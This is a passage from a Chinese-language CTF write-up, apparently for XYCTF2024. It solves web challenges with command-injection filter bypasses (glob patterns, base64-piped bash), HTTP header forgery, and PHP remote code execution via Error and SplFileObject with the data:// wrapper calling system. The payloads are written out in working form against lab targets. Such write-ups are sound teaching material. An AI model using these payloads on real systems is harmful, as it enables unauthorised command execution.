<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">. </span>flag</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/XYCTF2024/image-20250402154804684.png" alt="image-20250402154804684"></p>
<p>当然还有其他的命令</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> $(<span class="keyword">shell</span> <span class="keyword">cat</span> flag)</span><br></pre></td></tr></table></figure>

<p>解释一下payload</p>
<table>
<thead>
<tr>
<th><code>$(...)</code></th>
<th><strong>命令替换</strong>，先执行 <code>...</code> 里的命令，返回其输出（STDOUT）</th>
</tr>
</thead>
<tbody><tr>
<td><code>shell cat flag</code></td>
<td>尝试执行 <code>shell</code> 命令，并传 <code>cat flag</code> 作为参数</td>
</tr>
<tr>
<td><code>echo ...</code></td>
<td>打印命令替换后的结果</td>
</tr>
</tbody></table>
<h2 id="ez-Make"><a href="#ez-Make" class="headerlink" title="ez?Make"></a>ez?Make</h2><p>一样的页面，但是扫目录里是看不到flag了，有个Makefile路径，把Makefile文件下下来看看</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SHELL := /bin/bash</span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: FLAG</span></span><br><span class="line"><span class="section">FLAG: /flag</span></span><br><span class="line">	1</span><br></pre></td></tr></table></figure>

<p>这里指定了在执行shell命令时使用&#x2F;bin&#x2F;bash而不是默认的&#x2F;bin&#x2F;sh，这里和上面的题目不一样，这里不仅限于bash内置命令</p>
<p>但是这里禁用了很多命令，测试后发现cd是可以用的</p>
<p><img src="/../image/achieve/202411/XYCTF2024/image-20250402184608575.png" alt="image-20250402184608575"></p>
<p><img src="/../image/achieve/202411/XYCTF2024/image-20250402184557046.png" alt="image-20250402184557046"></p>
<p>因为已知flag在根目录，所以尝试直接读取flag，但是这里很多读取文件的命令都被禁用了，不过more可以用，然后就是绕过flag的关键字过滤了，也过滤了<code>*</code>和<code>?</code>看看用<code>[]</code>去匹配，一开始是用<code>[a-z]</code>的，但是发现被过滤了，不过好在用[0-z]能匹配出来</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">..</span> &amp;&amp; <span class="keyword">cd</span> <span class="string">..</span> &amp;&amp; <span class="keyword">cd</span> <span class="string">..</span>&amp;&amp;more [0-z][0-z][0-z][0-z]</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/XYCTF2024/image-20250402185222669.png" alt="image-20250402185222669"></p>
<p>或者也可以cd到bin目录下执行bash命令</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">..</span> &amp;&amp; <span class="keyword">cd</span> <span class="string">..</span> &amp;&amp; <span class="keyword">cd</span> <span class="string">..</span>&amp;&amp; <span class="keyword">cd</span> bin &amp;&amp; <span class="keyword">echo</span> <span class="string">&quot;bHM=&quot;</span> | b[0-z]se64 -d | b[0-z]sh</span><br><span class="line">执行<span class="keyword">ls</span>命令</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/XYCTF2024/image-20250402185609304.png" alt="image-20250402185609304"></p>
<p>然后我们cat &#x2F;flag就可以了</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">..</span> &amp;&amp; <span class="keyword">cd</span> <span class="string">..</span> &amp;&amp; <span class="keyword">cd</span> <span class="string">..</span>&amp;&amp; <span class="keyword">cd</span> bin &amp;&amp; <span class="keyword">echo</span> <span class="string">&quot;Y2F0IC9mbGFn&quot;</span> | b[0-z]se64 -d | b[0-z]sh</span><br></pre></td></tr></table></figure>

<h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><h3 id="请求头伪造"><a href="#请求头伪造" class="headerlink" title="#请求头伪造"></a>#请求头伪造</h3><p>一个登录页面，有账号有密码登录框</p>
<p>扫i目录扫出很多东西</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[19:01:03]</span> Scanning:</span><br><span class="line"><span class="selector-attr">[19:01:34]</span> <span class="number">200</span> -     <span class="number">0</span>B - /flag<span class="selector-class">.php</span></span><br><span class="line"><span class="selector-attr">[19:01:36]</span> <span class="number">200</span> -    <span class="number">1</span>KB - /index<span class="selector-class">.php</span></span><br><span class="line"><span class="selector-attr">[19:01:37]</span> <span class="number">200</span> -    <span class="number">1</span>KB - /index.php/login/</span><br><span class="line"><span class="selector-attr">[19:01:48]</span> <span class="number">200</span> -    <span class="number">35</span>B - /robots<span class="selector-class">.txt</span></span><br><span class="line"><span class="selector-attr">[19:01:49]</span> <span class="number">403</span> -   <span class="number">279</span>B - /server-status/</span><br><span class="line"><span class="selector-attr">[19:01:49]</span> <span class="number">403</span> -   <span class="number">279</span>B - /server-status</span><br></pre></td></tr></table></figure>

<p>访问&#x2F;robots.txt有一个&#x2F;l0g1n.txt</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">username:</span> XYCTF</span><br><span class="line"><span class="symbol">password:</span> @JOILha!wuigqi123$</span><br></pre></td></tr></table></figure>

<p>拿到账密了，登录有显示</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">登录成功！</span><br><span class="line">不是 yuanshen<span class="selector-class">.com</span> 来的我不要</span><br></pre></td></tr></table></figure>

<p>伪造请求头，抓包处理吧，这里直接放修改的地方了</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Referer:</span> yuanshen.com <span class="comment">// 从yuanshen.com来的</span></span><br><span class="line">User-Agent: XYCTF <span class="comment">//用XYCTF浏览器</span></span><br><span class="line">Client-IP: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="comment">// 本地用户伪造，不用xff（X-Forward-For）</span></span><br><span class="line"><span class="symbol">Via:</span> ymzx.qq.com <span class="comment">//从ymzx.qq.com代理</span></span><br><span class="line"><span class="symbol">Cookie:</span> XYCTF <span class="comment">//想吃点XYCTF的小饼干</span></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/XYCTF2024/image-20250402191734884.png" alt="image-20250402191734884"></p>
<h2 id="ezClass"><a href="#ezClass" class="headerlink" title="ezClass"></a>ezClass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$aa</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;aa&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$bb</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;bb&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">( (<span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$aa</span>) )-&gt;<span class="variable">$c</span>() )( (<span class="keyword">new</span> <span class="variable">$b</span>(<span class="variable">$bb</span>) )-&gt;<span class="variable">$c</span>() );</span><br></pre></td></tr></table></figure>

<p><code>((new $a($aa))-&gt;$c())((new $b($bb))-&gt;$c());</code>：动态创建两个对象，并调用它们的方法，然后将第二个对象方法的返回值作为参数传递给第一个对象方法。第一个的返回值需要是一个函数，而第二个的返回值是作为参数传递给第一个返回的函数。</p>
<p>这里第一个想到的是利用原生类中的方法去写马</p>
<h3 id="Error内置类实现RCE"><a href="#Error内置类实现RCE" class="headerlink" title="#Error内置类实现RCE"></a>#Error内置类实现RCE</h3><p>可以用Error内置类去打，其中Error::getMessage方法可以返回Error类实例化时接受的字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;wanth3f1ag&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = ((<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;123456&quot;</span>))-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="comment">//wanth3f1ag</span></span><br><span class="line"><span class="comment">//123456</span></span><br></pre></td></tr></table></figure>

<p>所以基本思路就是创建两个error类分别给system和cat &#x2F;flag两个参数，再用getMessage方法把输进去的参数当作字符串返回</p>
<p><img src="/../image/achieve/202411/XYCTF2024/image-20250402194903136.png" alt="image-20250402194903136"></p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET:?a=<span class="built_in">Error</span>&amp;aa=system&amp;c=getMessage&amp;b=<span class="built_in">Error</span>&amp;bb=ls /</span><br><span class="line">等价于</span><br><span class="line"><span class="function"><span class="params">((<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;system&#x27;</span>))-&gt;getMessage())((<span class="keyword">new</span> $<span class="built_in">Error</span>(<span class="string">&#x27;ls /&#x27;</span>))-&gt;getMessage())</span>;</span></span><br><span class="line"><span class="function">等价于</span></span><br><span class="line"><span class="function"><span class="title">system</span><span class="params">(<span class="string">&#x27;ls /&#x27;</span>)</span></span></span><br><span class="line"><span class="function">?<span class="title">a</span>=<span class="title">SplFileObject</span>&amp;<span class="title">aa</span>=<span class="title">data</span>://<span class="title">text</span>/<span class="title">plain</span>,<span class="title">system</span>&amp;<span class="title">c</span>=<span class="title">__toString</span>&amp;<span class="title">b</span>=<span class="title">SplFileObject</span>&amp;<span class="title">bb</span>=<span class="title">data</span>://<span class="title">text</span>/<span class="title">plain</span>,<span class="title">cat</span>%20/<span class="title">flag</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/XYCTF2024/image-20250402194428990.png" alt="image-20250402194428990"></p>
<h3 id="SplFileObject内置类-data伪协议"><a href="#SplFileObject内置类-data伪协议" class="headerlink" title="#SplFileObject内置类+data伪协议"></a>#SplFileObject内置类+data伪协议</h3><p>也用SplFileObject内置类去打，我们先看看SplFileObjectp类中有什么内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SplFileObject</span> <span class="keyword">extends</span> <span class="title">SplFileInfo</span> <span class="keyword">implements</span> <span class="title">RecursiveIterator</span>, <span class="title">SeekableIterator</span> </span>&#123;</span><br><span class="line"><span class="comment">/* 常量 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">const</span> <span class="variable constant_">int</span> DROP_NEW_LINE;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">const</span> <span class="variable constant_">int</span> READ_AHEAD;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">const</span> <span class="variable constant_">int</span> SKIP_EMPTY;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">const</span> <span class="variable constant_">int</span> READ_CSV;</span><br><span class="line"><span class="comment">/* 方法 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">__construct</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$filename</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$mode</span> = <span class="string">&quot;r&quot;</span>,</span><br><span class="line">    <span class="keyword">bool</span> <span class="variable">$useIncludePath</span> = <span class="literal">false</span>,</span><br><span class="line">    ?resource <span class="variable">$context</span> = <span class="literal">null</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">current</span>(): <span class="keyword">string</span>|<span class="keyword">array</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">eof</span>(): <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">fflush</span>(): <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">fgetc</span>(): <span class="keyword">string</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">fgetcsv</span>(<span class="keyword">string</span> <span class="variable">$separator</span> = <span class="string">&quot;,&quot;</span>, <span class="keyword">string</span> <span class="variable">$enclosure</span> = <span class="string">&quot;\&quot;&quot;</span>, <span class="keyword">string</span> <span class="variable">$escape</span> = <span class="string">&quot;\\&quot;</span>): <span class="keyword">array</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">fgets</span>(): <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">fgetss</span>(<span class="keyword">string</span> <span class="variable">$allowable_tags</span> = ?): <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">flock</span>(<span class="keyword">int</span> <span class="variable">$operation</span>, <span class="keyword">int</span> &amp;<span class="variable">$wouldBlock</span> = <span class="literal">null</span>): <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">fpassthru</span>(): <span class="keyword">int</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">fputcsv</span>(</span><br><span class="line">    <span class="keyword">array</span> <span class="variable">$fields</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$separator</span> = <span class="string">&quot;,&quot;</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$enclosure</span> = <span class="string">&quot;\&quot;&quot;</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$escape</span> = <span class="string">&quot;\\&quot;</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$eol</span> = <span class="string">&quot;\n&quot;</span></span><br><span class="line">): <span class="keyword">int</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">fread</span>(<span class="keyword">int</span> <span class="variable">$length</span>): <span class="keyword">string</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">fscanf</span>(<span class="keyword">string</span> <span class="variable">$format</span>, <span class="keyword">mixed</span> &amp;...<span class="variable">$vars</span>): <span class="keyword">array</span>|<span class="keyword">int</span>|<span class="literal">null</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">fseek</span>(<span class="keyword">int</span> <span class="variable">$offset</span>, <span class="keyword">int</span> <span class="variable">$whence</span> = SEEK_SET): <span class="keyword">int</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">fstat</span>(): <span class="keyword">array</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">ftell</span>(): <span class="keyword">int</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">ftruncate</span>(<span class="keyword">int</span> <span class="variable">$size</span>): <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">fwrite</span>(<span class="keyword">string</span> <span class="variable">$data</span>, <span class="keyword">int</span> <span class="variable">$length</span> = <span class="number">0</span>): <span class="keyword">int</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">getChildren</span>(): <span class="literal">null</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">getCsvControl</span>(): <span class="keyword">array</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">getFlags</span>(): <span class="keyword">int</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">getMaxLineLen</span>(): <span class="keyword">int</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">hasChildren</span>(): <span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">key</span>(): <span class="keyword">int</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">next</span>(): <span class="keyword">void</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">rewind</span>(): <span class="keyword">void</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">seek</span>(<span class="keyword">int</span> <span class="variable">$line</span>): <span class="keyword">void</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">setCsvControl</span>(<span class="keyword">string</span> <span class="variable">$separator</span> = <span class="string">&quot;,&quot;</span>, <span class="keyword">string</span> <span class="variable">$enclosure</span> = <span class="string">&quot;\&quot;&quot;</span>, <span class="keyword">string</span> <span class="variable">$escape</span> = <span class="string">&quot;\\&quot;</span>): <span class="keyword">void</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">setFlags</span>(<span class="keyword">int</span> <span class="variable">$flags</span>): <span class="keyword">void</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">setMaxLineLen</span>(<span class="keyword">int</span> <span class="variable">$maxLength</span>): <span class="keyword">void</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">__toString</span>(): <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">valid</span>(): <span class="keyword">bool</span></span><br><span class="line"><span class="comment">/* 继承的方法 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getATime</span>(): <span class="keyword">int</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getBasename</span>(<span class="keyword">string</span> <span class="variable">$suffix</span> = <span class="string">&quot;&quot;</span>): <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getCTime</span>(): <span class="keyword">int</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getExtension</span>(): <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getFileInfo</span>(?<span class="keyword">string</span> <span class="variable">$class</span> = <span class="literal">null</span>): <span class="built_in">SplFileInfo</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getFilename</span>(): <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getGroup</span>(): <span class="keyword">int</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getInode</span>(): <span class="keyword">int</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getLinkTarget</span>(): <span class="keyword">string</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getMTime</span>(): <span class="keyword">int</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getOwner</span>(): <span class="keyword">int</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getPath</span>(): <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getPathInfo</span>(?<span class="keyword">string</span> <span class="variable">$class</span> = <span class="literal">null</span>): ?<span class="built_in">SplFileInfo</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getPathname</span>(): <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getPerms</span>(): <span class="keyword">int</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getRealPath</span>(): <span class="keyword">string</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getSize</span>(): <span class="keyword">int</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">getType</span>(): <span class="keyword">string</span>|<span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">isDir</span>(): <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">isExecutable</span>(): <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">isFile</span>(): <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">isLink</span>(): <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">isReadable</span>(): <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">isWritable</span>(): <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">openFile</span>(<span class="keyword">string</span> <span class="variable">$mode</span> = <span class="string">&quot;r&quot;</span>, <span class="keyword">bool</span> <span class="variable">$useIncludePath</span> = <span class="literal">false</span>, ?resource <span class="variable">$context</span> = <span class="literal">null</span>): <span class="built_in">SplFileObject</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">setFileClass</span>(<span class="keyword">string</span> <span class="variable">$class</span> = <span class="title class_">SplFileObject</span>::<span class="variable language_">class</span>): <span class="keyword">void</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">setInfoClass</span>(<span class="keyword">string</span> <span class="variable">$class</span> = <span class="title class_">SplFileInfo</span>::<span class="variable language_">class</span>): <span class="keyword">void</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">SplFileInfo</span>::<span class="title function_ invoke__">__toString</span>(): <span class="keyword">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于这里$c是调用的方法，在最后一行中两边是一致的，但是跟Error中一样的，这里也有一个<code>__toString</code>方法</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SplFileObject::__toString —以字符串形式返回当前行</span><br></pre></td></tr></table></figure>

<p>在本地测试一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@VM-<span class="number">16</span>-<span class="number">12</span>-ubuntu:/<span class="keyword">var</span>/www/html<span class="comment"># cat test.php </span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br><span class="line">root@VM-<span class="number">16</span>-<span class="number">12</span>-ubuntu:/<span class="keyword">var</span>/www/html<span class="comment"># vim 1.php</span></span><br><span class="line">root@VM-<span class="number">16</span>-<span class="number">12</span>-ubuntu:/<span class="keyword">var</span>/www/html<span class="comment"># cat 1.php </span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&quot;test.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">__toString</span>();</span><br><span class="line">root@VM-<span class="number">16</span>-<span class="number">12</span>-ubuntu:/<span class="keyword">var</span>/www/html<span class="comment"># php 1.php </span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是这里因为是两个部分的调用返回值进行配合，并且当前目录下的内容是不可知的，所以不能直接读取flag文件，也是需要写命令执行语句</p>
<p>这里需要配合data伪协议去输出,data伪协议可以动态生成文件而无需真实文件。通过data伪协议去包装数据，使得我们可以<strong>输出 <code>data://</code> 包装的数据</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&quot;data://text/plain,system&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">__toString</span>();</span><br><span class="line"><span class="comment">//system</span></span><br></pre></td></tr></table></figure>

<p>所以我们最终的payload就是</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=SplFileObject&amp;aa=data://text/plain,system&amp;c=__toString&amp;b=SplFileObject&amp;bb=data://text/plain,<span class="built_in">cat</span>%20/flag</span><br></pre></td></tr></table></figure>

